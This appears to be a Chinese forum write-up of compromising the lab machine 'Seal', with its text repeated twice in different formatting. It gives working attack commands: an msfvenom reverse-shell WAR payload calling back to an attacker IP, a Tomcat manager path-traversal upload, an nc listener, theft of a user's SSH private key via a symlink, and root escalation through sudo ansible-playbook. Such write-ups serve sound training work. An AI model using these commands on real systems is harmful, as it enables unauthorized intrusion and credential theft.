
# [原创] 靶机Seal的渗透

老规矩拿出`nmap`

```
nmap -A -sS -sC -sV -p- 10.10.10.250
```

开放端口 22 443 8080

`cms`::::::: `gitbucketgitbucket`

![](upload/attach/202109/904178_4UTRVZ8JBSAETGC.jpg)

注册账号查看搭建方式`nginx` `tomcat`

然后443端口访问状态码为400 那就做解析

```
echo 10.10.10.250 seal.htb >> /etc/hosts
```

![](upload/attach/202109/904178_HK9R3N57DBSG9AP.jpg)

![](upload/attach/202109/904178_X5E5MAZVTEF6PPQ.jpg)

刷新配置文件就发现了如下信息

<mark class="encrypted">623K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3q4D9i4K6u0W2K9s2c8T1i4K6u0r3L8h3q4F1j5h3N6W2M7W2)9J5c8Y4y4@1j5i4c8#2M7#2)9J5c8W2)9J5k6g2)9J5k6g2)9K6b7W2)9J5c8X3S2@1L8h3H3`.</mark>

`war`包上去会自动解压

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.14 LPORT=4444 -f war -o shell.war`

![](upload/attach/202109/904178_RM2PMCS45H342N3.jpg)

上传点修改为 `/manager/status/..;/html/upload;`

```
监听nc -nvlp 4444
```

![](upload/attach/202109/904178_2Q6RS63NN9K7QJX.jpg)

然后访问<mark class="encrypted">e17K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3q4D9i4K6u0W2K9s2c8T1i4K6u0r3M7$3S2W2L8r3I4Q4x3V1j5`.</mark>

创建一个控制台`python3 -c 'import pty;pty.spawn("/bin/bash");'`

参考<mark class="encrypted">9c8K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2W2N6X3q4D9j5Y4g2Y4i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9I4z5q4)9J5c8U0l9%4i4K6u0r3x3U0g2Q4x3V1k6S2L8Y4c8K6N6$3!0J5k6q4)9#2k6Y4m8J5L8$3#2H3N6q4)9#2k6Y4y4Z5k6h3I4D9i4K6u0r3</mark>

`cd /opt/backups/playbook`

`rum.yml`

分析一波 创建软连接解决这个问题

```
ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa
cp backup-2021-08-05-08:46:33.gz /dev/shm
cd /dev/shm
mv backup-2021-07-12-08:46:33.gz backup.tar.gz
tar -xvf backup.tar.gz
```

![](upload/attach/202109/904178_QDY93522CCK66BC.jpg)

```
cat id_rsa
chmod 600 id_rsa
ssh luis@10.10.10.250 -i id_rsa
```

![](upload/attach/202109/904178_ACDQYPG24RKS8Z4.jpg)

权限提升

```
sudo -l 显示出自己（执行 sudo 的用户）的权限
```

`luis@seal:~$ sudo -l`

Matching Defaults entries for luis on seal:

`env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin`

User luis may run the following commands on seal:

`(ALL) NOPASSWD: /usr/bin/ansible-playbook *`

`luis@seal:~$`

可以`root`权限执行 `/usr/bin/ansible-playbook`

创建一个文件参考

<mark class="encrypted">1faK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9K9h3&6C8i4K6u0W2P5X3S2A6K9s2g2Q4x3X3g2U0L8$3#2Q4x3V1k6Q4x3@1k6@1j5i4u0Y4k6i4c8Q4x3@1c8Z5N6s2c8H3M7#2)9J5y4e0y4m8i4K6u0r3i4K6u0r3k6r3!0U0M7#2)9J5k6h3q4F1M7$3W2T1L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6S2L8Y4y4A6j5X3I4W2i4K6u0r3L8r3q4@1k6i4y4@1i4K6u0r3N6i4y4W2M7W2)9#2k6X3N6#2K9h3c8W2i4K6u0r3M7r3I4S2P5h3u0G2L8$3E0K6i4K6u0W2K9s2c8E0L8l9`.</mark>

使用`sudo /usr/bin/ansible-playbook`执行`root.yml`文件

`cat root.txt`

`a18fdff4cccc7a1b0ef961fa8f007756`

机器赋予`root`权限

老规矩拿出`nmap`

|  |  |
| --- | --- |
| 1 | `nmap` `-A` `-sS` `-sC` `-sV` `-p-` `10.10.10.250` |

开放端口 22 443 8080

`cms`::::::: `gitbucketgitbucket`

![](https://bbs.kanxue.com/upload/attach/202109/904178_4UTRVZ8JBSAETGC.jpg)

注册账号查看搭建方式`nginx` `tomcat`

然后443端口访问状态码为400 那就做解析

|  |  |
| --- | --- |
| 1 | `echo` `10.10.10.250` `seal.htb >>` `/etc/hosts` |

![](https://bbs.kanxue.com/upload/attach/202109/904178_HK9R3N57DBSG9AP.jpg)

![](https://bbs.kanxue.com/upload/attach/202109/904178_X5E5MAZVTEF6PPQ.jpg)

刷新配置文件就发现了如下信息

`523K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3q4D9i4K6u0W2K9s2c8T1i4K6u0r3L8h3q4F1j5h3N6W2M7W2)9J5c8Y4y4@1j5i4c8#2M7#2)9J5c8W2)9J5k6g2)9J5k6g2)9K6b7W2)9J5c8X3S2@1L8h3H3`.`.

`war`包上去会自动解压

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.14 LPORT=4444 -f war -o shell.war`

![](https://bbs.kanxue.com/upload/attach/202109/904178_RM2PMCS45H342N3.jpg)

上传点修改为 `/manager/status/..;/html/upload;`

|  |  |
| --- | --- |
| 1 | `监听nc` `-nvlp` `4444` |

![](https://bbs.kanxue.com/upload/attach/202109/904178_2Q6RS63NN9K7QJX.jpg)

然后访问`603K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3q4D9i4K6u0W2K9s2c8T1i4K6u0r3M7$3S2W2L8r3I4Q4x3V1j5`.`.

创建一个控制台`python3 -c 'import pty;pty.spawn("/bin/bash");'`

参考`123K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2W2N6X3q4D9j5Y4g2Y4i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9I4z5q4)9J5c8U0l9%4i4K6u0r3x3U0g2Q4x3V1k6S2L8Y4c8K6N6$3!0J5k6q4)9#2k6Y4m8J5L8$3#2H3N6q4)9#2k6Y4y4Z5k6h3I4D9i4K6u0r3`

`cd /opt/backups/playbook`

`rum.yml`

分析一波 创建软连接解决这个问题

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9 | `ln -s ~/home/luis/.ssh/id_rsa` `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa`  `cp backup-2021-08-05-08:46:33.gz` `/dev/shm`  `cd` `/dev/shm`  `mv backup-2021-07-12-08:46:33.gz` `backup.tar.gz`  `tar -xvf backup.tar.gz` |

![](https://bbs.kanxue.com/upload/attach/202109/904178_QDY93522CCK66BC.jpg)

|  |  |
| --- | --- |
| 1  2  3  4  5 | `cat id_rsa`  `chmod` `600` `id_rsa`  `ssh luis@10.10.10.250` `-i id_rsa` |

![](https://bbs.kanxue.com/upload/attach/202109/904178_ACDQYPG24RKS8Z4.jpg)

权限提升

|  |  |
| --- | --- |
| 1 | `sudo -l 显示出自己（执行 sudo 的用户）的权限` |

`luis@seal:~$ sudo -l`

Matching Defaults entries for luis on seal:

|  |  |
| --- | --- |
| 1 | `env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin` |

User luis may run the following commands on seal:

|  |  |
| --- | --- |
| 1 | `(ALL) NOPASSWD:` `/usr/bin/ansible-playbook` `*` |

`luis@seal:~$`

可以`root`权限执行 `/usr/bin/ansible-playbook`

创建一个文件参考

`c48K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9K9h3&6C8i4K6u0W2P5X3S2A6K9s2g2Q4x3X3g2U0L8$3#2Q4x3V1k6Q4x3@1k6@1j5i4u0Y4k6i4c8Q4x3@1c8Z5N6s2c8H3M7#2)9J5y4e0y4m8i4K6u0r3i4K6u0r3k6r3!0U0M7#2)9J5k6h3q4F1M7$3W2T1L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6S2L8Y4y4A6j5X3I4W2i4K6u0r3L8r3q4@1k6i4y4@1i4K6u0r3N6i4y4W2M7W2)9#2k6X3N6#2K9h3c8W2i4K6u0r3M7r3I4S2P5h3u0G2L8$3E0K6i4K6u0W2K9s2c8E0L8l9`.`.

使用`sudo /usr/bin/ansible-playbook`执行`root.yml`文件

`cat root.txt`

`a18fdff4cccc7a1b0ef961fa8f007756`

机器赋予`root`权限

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
